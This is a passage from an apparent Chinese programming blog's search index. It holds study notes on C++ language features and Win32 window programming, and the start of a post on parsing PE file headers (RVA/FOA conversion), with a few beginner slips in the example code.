class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="built_in">demo</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line">demo&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span>::<span class="built_in">demo</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//需要这么定义</span></span><br><span class="line">&#125;</span><br><span class="line">demo&lt;<span class="keyword">int</span>&gt; a;</span><br><span class="line"><span class="comment">//需要这么调用</span></span><br></pre></td></tr></table></figure><br><h2 id="0x09-引用"><a href="#0x09-引用" class="headerlink" title="0x09 引用"></a>0x09 引用</h2><ul><li>函数传值时引用和指针在底层没有区别，引用是指针的语法糖，可以更安全的访问对象的内容。</li><li>安全是因为引用只能赋值一次，而且必须要初始化。</li><li>引用不占用空间，可以理解成变量的一个别名。（反汇编代码中不会存储引用的值）</li></ul><br><h2 id="0x0A-友元函数"><a href="#0x0A-友元函数" class="headerlink" title="0x0A 友元函数"></a>0x0A 友元函数</h2><p>什么时候需要用到友元函数：</p><ol><li>运算符重载</li><li>让别的函数和类访问自己的private</li></ol><p>友元函数和类的成员函数的区别</p><ol><li>成员函数有this指针，友元函数没有。</li><li>友元函数不可被继承，它只是普通的函数。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在类中声明即可</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">demo</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><br><h2 id="0x0B-运算符重载"><a href="#0x0B-运算符重载" class="headerlink" title="0x0B 运算符重载"></a>0x0B 运算符重载</h2><ul><li>运算符重载就是函数替换</li><li><code>. :: ?: sizeof #</code>不能重载</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型 <span class="keyword">operator</span>重载的符号();</span><br></pre></td></tr></table></figure><p>一种情况中，运算符重载一定要用友元函数：当该运算符的第一个运算数为其他类的时候。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//友元函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ss</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        x=<span class="number">10</span>;</span><br><span class="line">        y=<span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">friend</span> demo <span class="keyword">operator</span>+(demo&amp; pp,demo&amp; bb);</span><br><span class="line">&#125;;</span><br><span class="line">demo <span class="keyword">operator</span>+(demo&amp; pp,demo&amp; bb)</span><br><span class="line">&#123;</span><br><span class="line">    pp.x=pp.x+bb.x;</span><br><span class="line">    pp.y=pp.y+pp.y;</span><br><span class="line">    <span class="keyword">return</span> pp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//成员函数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ss</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        x=<span class="number">10</span>;</span><br><span class="line">        y=<span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    demo <span class="keyword">operator</span>+(demo&amp; pp)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x=pp.x+<span class="keyword">this</span>-&gt;x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y=pp.y+<span class="keyword">this</span>-&gt;y;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><h2 id="0x0c-new-delete"><a href="#0x0c-new-delete" class="headerlink" title="0x0c new delete"></a>0x0c new delete</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* a = <span class="keyword">new</span> <span class="keyword">int</span>;<span class="comment">//分配一个int类型</span></span><br><span class="line"><span class="keyword">int</span>* b = <span class="keyword">new</span> <span class="built_in"><span class="keyword">int</span></span>(<span class="number">5</span>);<span class="comment">//分配一个int类型，初始值为5</span></span><br><span class="line"><span class="keyword">int</span>* c = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];<span class="comment">//分配5个int类型（数组）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> a;</span><br><span class="line"><span class="keyword">delete</span> b;</span><br><span class="line"><span class="keyword">delete</span>[] c;</span><br></pre></td></tr></table></figure><br><h1 id="win32"><a href="#win32" class="headerlink" title="win32"></a>win32</h1><h2 id="0x00-宽字符"><a href="#0x00-宽字符" class="headerlink" title="0x00 宽字符"></a>0x00 宽字符</h2><p>UNICODE字符占用两个字节，char只能存储一个字节，所以我们要使用宽字符。然后使用L表示查询UNICODE表而不是ASCII表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> cn = <span class="string">L&#x27;中&#x27;</span>;</span><br><span class="line"><span class="comment">//char数组末尾有一个\0，宽字符数组末尾有两个\0</span></span><br><span class="line"><span class="keyword">wchar_t</span> cn[] = <span class="string">L&quot;中国&quot;</span>;</span><br></pre></td></tr></table></figure><p>打印出中文需要让编译器知道你的国家，否则编译器不知道怎么解释Unicode编码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;%s\n&quot;</span>,cn);</span><br></pre></td></tr></table></figure><p><code>setlocale()</code>函数既可以用来对当前程序进行<strong>地域设置</strong>（本地设置、区域设置），也可以用来获取当前程序的<strong>地域设置信息</strong>。</p><p>打印长度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> x[] = <span class="string">&quot;中国&quot;</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> x2[] = <span class="string">L&quot;中国&quot;</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> x3[] = <span class="string">L&quot;中A国&quot;</span>;</span><br><span class="line"><span class="built_in">strlen</span>(x);<span class="comment">//4</span></span><br><span class="line"><span class="built_in">wcslen</span>(x2);<span class="comment">//2</span></span><br><span class="line"><span class="built_in">wcslen</span>(x3);<span class="comment">//3</span></span><br></pre></td></tr></table></figure><p>TCHAR在ASCII环境下就是CHAR类型，在UNICODE环境下就是WCHAR类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CHAR cha[] = <span class="string">&quot;中国&quot;</span>;</span><br><span class="line">WCHAR chw[] = <span class="string">L&quot;中国&quot;</span>;</span><br><span class="line">TCHAR cht[] = <span class="built_in">TEXT</span>(<span class="string">&quot;中国&quot;</span>);</span><br><span class="line">TCHAR cht2 = <span class="built_in">TEXT</span>(<span class="string">&quot;中&quot;</span>);</span><br></pre></td></tr></table></figure><p>举个例子，MessageBox和TCHAR一样也是个宏</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>,<span class="string">&quot;内容多字节&quot;</span>,<span class="string">&quot;标题&quot;</span>,MB_OK);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBoxW</span>(<span class="number">0</span>,<span class="string">L&quot;内容宽字节&quot;</span>,<span class="string">L&quot;标题&quot;</span>,MB_OK);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>,<span class="built_in">TEXT</span>(<span class="string">&quot;根据项目字符集决定&quot;</span>),<span class="built_in">TEXT</span>(<span class="string">&quot;标题&quot;</span>),MB_OK);</span><br><span class="line"><span class="comment">//Windows提供的API 凡是需要传递字符串参数的函数，都会提供两个版本和一个宏.</span></span><br></pre></td></tr></table></figure><br><h2 id="0x01-win32概述和入口函数"><a href="#0x01-win32概述和入口函数" class="headerlink" title="0x01 win32概述和入口函数"></a>0x01 win32概述和入口函数</h2><p>win32 api主要是存放在C:\WINDOWS\system32下面的dll</p><p>非常重要的DLL：</p><ul><li>Kernel32.dll：最核心的功能模块，比如管理内存、进程和线程相关的函数等.</li><li>User32.dll：是Windows用户界面相关应用程序接口，如创建窗口和发送消息等.</li><li>GDI32.dll：全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数：比如要显示一个程序窗口，就调用了其中的函数来画这个窗口</li></ul><p>windows的入口函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(<span class="comment">//WINAPI是调用约定__stdcall</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_  HINSTANCE hInstance,<span class="comment">//程序的ImageBase</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_  HINSTANCE hPrevInstance,<span class="comment">//没有任何意义。它在16位Windows中使用，但现在始终为零。</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_  LPSTR lpCmdLine,<span class="comment">//包含命令行参数作为Unicode字符串。就是在程序运行前传个值，和main的参数一样。</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_  <span class="keyword">int</span> nCmdShow<span class="comment">//一个标志，指示是否将主应用程序窗口最小化，最大化或正常显示。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="0x02-对句柄的理解"><a href="#0x02-对句柄的理解" class="headerlink" title="0x02 对句柄的理解"></a>0x02 对句柄的理解</h2><p>句柄是进程中相应对象的索引而已，有点像数组的下标，比如事件句柄<code>hModule ev = CreateEvent(NULL, NULL, NULL, NULL);</code>其实是创建了一个内核对象<code>KEVENT</code>和一个能索引到这个对象的句柄<code>ev</code>。之所以用句柄而不是指针，是因为用指针的话用户就可以直接直接操作内核对象了，比较危险，而句柄只是个索引（下标），通过API函数把这个索引传进去让系统API函数来操作就会安全些。</p><p><code>hModule</code>和<code>hInstance</code>在32位下是一样句柄，他们指向程序在内存中的地址（ImageBase）；</p><p><code>hwnd</code>则是窗口的句柄。</p><br><h2 id="0x03-消息与事件"><a href="#0x03-消息与事件" class="headerlink" title="0x03 消息与事件"></a>0x03 消息与事件</h2><p>windows中的事件就是一个动作，比如你点击了鼠标，滑动了鼠标都是事件。</p><p>消息就是用来描述动作的。</p><p>windows为了能准确的描述这些信息，提供了一个结构体：MSG。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> &#123;</span></span><br><span class="line">HWND   hwnd;<span class="comment">//用于标识窗口，窗口的句柄</span></span><br><span class="line">UINT   message;<span class="comment">//消息类型。</span></span><br><span class="line">WPARAM wParam;<span class="comment">//对消息类型进一步的说明</span></span><br><span class="line">LPARAM lParam;<span class="comment">//对消息类型进一步的说明</span></span><br><span class="line">DWORD  time;<span class="comment">//消息创建时的时间</span></span><br><span class="line">POINT  pt;<span class="comment">//坐标，你鼠标的位置</span></span><br><span class="line">&#125; MSG, *PMSG;</span><br></pre></td></tr></table></figure><br><h2 id="0x04-创建窗口"><a href="#0x04-创建窗口" class="headerlink" title="0x04 创建窗口"></a>0x04 创建窗口</h2><p>创建窗口的过程：</p><p><img src="https://i.loli.net/2021/01/13/lASifrd8Ue2yGMj.png" alt="image-20210113150148794"></p><p>创建窗口的步骤：</p><ol><li>设计窗口类</li><li>注册上面设计的窗口</li><li>创建窗口</li><li>显示窗口</li><li>消息循环</li><li>回调函数</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//窗口的类名</span></span><br><span class="line">TCHAR className[] = <span class="string">&quot;My First Window&quot;</span>;</span><br><span class="line"><span class="comment">// 创建窗口类的对象</span></span><br><span class="line">WNDCLASS wndclass = &#123;<span class="number">0</span>&#125;;<span class="comment">//一定要先将所有值赋值</span></span><br><span class="line">wndclass.hbrBackground = (HBRUSH)COLOR_MENU+<span class="number">1</span>;<span class="comment">//窗口的背景色，使用颜色的时候，必须把每个颜色宏+1，才能得到正确的颜色，这是用法，没有特别的含义。</span></span><br><span class="line">wndclass.lpfnWndProc = WindowProc;<span class="comment">//窗口过程函数</span></span><br><span class="line">wndclass.lpszClassName = className;<span class="comment">//窗口类的名字</span></span><br><span class="line">wndclass.hInstance = hInstance;<span class="comment">//定义窗口类的应用程序的实例句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注册窗口类</span></span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wndclass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd = <span class="built_in">CreateWindow</span>(</span><br><span class="line">className,<span class="comment">//类名</span></span><br><span class="line"><span class="built_in">TEXT</span>(<span class="string">&quot;我的第一个窗口&quot;</span>),<span class="comment">//窗口标题</span></span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">//窗口外观样式</span></span><br><span class="line"><span class="number">10</span>,<span class="comment">//相对于父窗口的X坐标</span></span><br><span class="line"><span class="number">10</span>,<span class="comment">//相对于父窗口的Y坐标</span></span><br><span class="line"><span class="number">600</span>,<span class="comment">//窗口的宽度</span></span><br><span class="line"><span class="number">300</span>,<span class="comment">//窗口的高度</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//父窗口句柄，为NULL</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//菜单句柄，为NULL。在子窗口时是个用于区分的编号</span></span><br><span class="line">hInstance,<span class="comment">//当前应用程序的句柄</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">//附加数据一般为NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hwnd == <span class="literal">NULL</span>)<span class="comment">//是否创建成功</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line">MSG msg;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN  HWND hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">IN  UINT uMsg,</span></span></span><br><span class="line"><span class="params"><span class="function">IN  WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">IN  LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span>(uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//窗口消息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd,uMsg,wParam,lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WNDCLASS结构：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagWNDCLASSA</span> &#123;</span></span><br><span class="line">UINT      style;<span class="comment">//</span></span><br><span class="line">WNDPROC   lpfnWndProc;<span class="comment">//窗口的消息处理函数</span></span><br><span class="line"><span class="keyword">int</span>       cbClsExtra;<span class="comment">//</span></span><br><span class="line"><span class="keyword">int</span>       cbWndExtra;<span class="comment">//</span></span><br><span class="line">HINSTANCE hInstance;<span class="comment">//当前窗口属于哪一个应用程序</span></span><br><span class="line">HICON     hIcon;<span class="comment">//窗口的标识</span></span><br><span class="line">HCURSOR   hCursor;<span class="comment">//窗口中鼠标的形状</span></span><br><span class="line">HBRUSH    hbrBackground;<span class="comment">//窗口的背景色</span></span><br><span class="line">LPCSTR    lpszMenuName;<span class="comment">//窗口菜单的名字</span></span><br><span class="line">LPCSTR    lpszClassName;<span class="comment">//窗口类的名字</span></span><br><span class="line">&#125; WNDCLASSA, *PWNDCLASSA, *NPWNDCLASSA, *LPWNDCLASSA;</span><br></pre></td></tr></table></figure><p>消息处理函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HWND   hwnd,<span class="comment">//用于标识窗口，窗口的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT   uMsg,<span class="comment">//消息类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ WPARAM wParam,<span class="comment">//对消息类型进一步的说明</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ LPARAM lParam<span class="comment">//对消息类型进一步的说明</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><br><h2 id="0x0？一些要用过的函数"><a href="#0x0？一些要用过的函数" class="headerlink" title="0x0？一些要用过的函数"></a>0x0？一些要用过的函数</h2><p><code>GetLastError</code>跟在出错的函数后面，可以返回错误码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD errorcode = <span class="built_in">GetLastError</span>();</span><br></pre></td></tr></table></figure><p><code>GetModuleHandle</code>返回<code>ImageBase</code></p>]]></content>
      
      
      <categories>
          
          <category> 2020年12月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[实验] PE解析</title>
      <link href="/2020/12/06/PE%E8%A7%A3%E6%9E%90/"/>
      <url>/2020/12/06/PE%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文使用的头文件有</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br></pre></td></tr></table></figure><p>写的比较烂，明年年初应该会全部重构一遍（捂脸</p><h1 id="0x01-RVA转换FOA"><a href="#0x01-RVA转换FOA" class="headerlink" title="0x01 RVA转换FOA"></a>0x01 RVA转换FOA</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">RVAtoFOA</span><span class="params">(<span class="keyword">int</span> RVA,<span class="keyword">char</span>* FileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line">    <span class="keyword">int</span> FOA=RVA;</span><br><span class="line">    <span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">short</span> NumberOfSections = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">short</span> SizeOfOptionalHeader = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> SectionAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">56</span>);</span><br><span class="line">    <span class="keyword">int</span> FileAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">int</span> SizeOfHeaders = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">84</span>);</span><br><span class="line"><span class="comment">//如果PE文件的内存对齐和文件对齐相等，则FOA=RVA</span></span><br><span class="line">    <span class="keyword">if</span> (SectionAlignment==FileAlignment)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FOA;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果RVA在PE头，则FOA=RVA</span></span><br><span class="line">    <span class="keyword">if</span> (RVA&lt;=SizeOfHeaders)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FOA;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//判断节</span></span><br><span class="line">    <span class="keyword">int</span> SectionTable = e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader;</span><br><span class="line">    <span class="keyword">int</span> VirtualAddress1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> VirtualAddress2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> PointerToRawData=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;NumberOfSections<span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        VirtualAddress1=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+i*<span class="number">40</span>);</span><br><span class="line">        VirtualAddress2=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+(i+<span class="number">1</span>)*<span class="number">40</span>);</span><br><span class="line">        PointerToRawData=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+(i)*<span class="number">40</span>);</span><br><span class="line">        <span class="keyword">if</span>(RVA&gt;=VirtualAddress1&amp;&amp;RVA&lt;VirtualAddress2)</span><br><span class="line">        &#123;</span><br><span class="line">            FOA=RVA-VirtualAddress1+PointerToRawData;</span><br><span class="line">            <span class="keyword">return</span> FOA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    VirtualAddress1=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>);</span><br><span class="line">    PointerToRawData=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>);</span><br><span class="line">    FOA=RVA-VirtualAddress1+PointerToRawData;</span><br><span class="line">    <span class="keyword">return</span> FOA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="0x02-FOA转换RVA"><a href="#0x02-FOA转换RVA" class="headerlink" title="0x02 FOA转换RVA"></a>0x02 FOA转换RVA</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 